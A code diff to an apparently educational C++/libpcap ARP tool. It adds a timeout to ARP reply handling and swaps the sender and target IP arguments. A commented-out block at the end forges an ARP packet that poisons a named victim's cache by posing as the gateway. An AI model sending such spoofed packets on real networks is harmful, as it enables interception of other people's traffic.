@@ -138,9 +138,7 @@ int main(int argc, char* argv[]) {
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <linux/if.h>
-#include <netdb.h>
-#include <string.h>
-#include <unistd.h>
+#include <ctime>
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -155,27 +153,33 @@ void usage() {
 }
 
 Mac receiveMac(pcap_t *handle, const Ip &target_ip) {
+    time_t start_time = time(nullptr);
+    bool received = false;
 
+    while (time(nullptr) - start_time < 5) {
         struct pcap_pkthdr *header;
         const u_char *packet;
         int res = pcap_next_ex(handle, &header, &packet);
 
-
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
 
         EthHdr *eth_hdr = (EthHdr *)packet;
         ArpHdr *arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));
 
         if (eth_hdr->type() == EthHdr::Arp &&
-            arp_hdr->op() == htons(ArpHdr::Reply) &&
             arp_hdr->sip() == target_ip) {
+            received = true;
             return arp_hdr->smac();
         }
+    }
 
-
+    if (!received) {
+        printf("Timeout occurred while waiting for ARP reply\n");
+    }
 
     return Mac("00:00:00:00:00:00");
 }
-
 
 int main(int argc, char* argv[]) {
     if (argc < 4 || argc % 2 != 0) { // 수정: argc 체크
@@ -205,6 +209,7 @@ int main(int argc, char* argv[]) {
 
     for (int i = 0; i < (argc - 2) / 2; i++) {
         //broadcast
+        packet.eth_.smac_ = Mac(atc_mac);
         packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
         packet.eth_.type_ = htons(EthHdr::Arp);
         packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -213,21 +218,43 @@ int main(int argc, char* argv[]) {
         packet.arp_.pln_ = Ip::SIZE;
         packet.arp_.op_ = htons(ArpHdr::Request);
         packet.arp_.smac_ = packet.eth_.smac_;
-        packet.arp_.sip_ = htonl(Ip(argv[i * 2 + 2]));
+        packet.arp_.sip_ = htonl(Ip(argv[i * 2 + 3]));
         packet.arp_.tmac_ = Mac::nullMac();
-        packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 3]));
+        packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 2]));
 
         int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
 
-        // 수정: ARP 응답 대기
-        sleep(1); // 1초 대기
-        Mac t_mac = receiveMac(handle, Ip(argv[i * 2 + 3]));
-        if (t_mac != Mac("00:00:00:00:00:00")) { // 수정: 브로드캐스팅 MAC 주소가 아닌 경우에만 출력
-            printf("MAC address of %s: %s\n", argv[i * 2 + 3], std::string(t_mac).c_str());
+        Mac t_mac = receiveMac(handle, Ip(argv[i * 2 + 2]));
+        if (t_mac != Mac("00:00:00:00:00:00")) {
+            printf("MAC address of %s: %s\n", argv[i * 2 + 2], std::string(t_mac).c_str());
+        } else {
+            printf("%s",  std::string(t_mac).c_str());
         }
+
+/*
+        packet.eth_.dmac_ = Mac("10:51:07:c6:33:ab");   //true victim mac
+        packet.eth_.smac_ = Mac("13:13:13:13:13:13");
+        packet.eth_.type_ = htons(EthHdr::Arp);
+
+        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+        packet.arp_.pro_ = htons(EthHdr::Ip4);
+        packet.arp_.hln_ = Mac::SIZE;
+        packet.arp_.pln_ = Ip::SIZE;
+        packet.arp_.op_ = htons(ArpHdr::Request);
+        packet.arp_.smac_ = Mac("10:01:10:01:10:01");   //false mac address for victim
+        packet.arp_.sip_ = htonl(Ip("192.168.242.95")); //fool vimtim me as a gateway ip
+        packet.arp_.tmac_ = Mac("10:51:07:c6:33:ab");   //victim mac
+        packet.arp_.tip_ = htonl(Ip("192.168.242.12")); //victim ip
+
+        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }
+
+        pcap_close(handle);*/
     }
 
     pcap_close(handle);
